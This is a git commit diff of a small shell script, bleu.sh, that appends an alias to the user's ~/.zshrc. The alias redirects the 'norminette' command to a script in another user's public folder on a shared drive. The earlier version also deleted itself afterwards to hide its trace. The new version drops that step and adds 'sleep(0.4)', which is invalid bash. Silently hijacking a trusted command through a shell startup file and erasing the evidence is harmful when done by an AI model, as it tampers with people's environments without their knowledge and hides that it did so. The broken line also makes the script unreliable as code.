98f7a36a57b39e5f0ea645b4c523174860e0d40c
deeznuts-42 <127157623+deeznuts-42@users.noreply.github.com>
2023-07-10 11:23:52 +0200

    Update bleu.sh

--- bleu.sh
+++ bleu.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-echo "alias norminette='sh /sgoinfre/goinfre/Perso/amugnier/PUBLIC/normicheh.sh'" >> ~/.zshrc
-source ~/.zshrc
-rm -rf ./bleu.sh
+echo "alias norminette='sh /sgoinfre/goinfre/Perso/amugnier/PUBLIC/normicheh.sh'" >> ~/.zshrc;
+sleep(0.4)
+source ~/.zshrc;
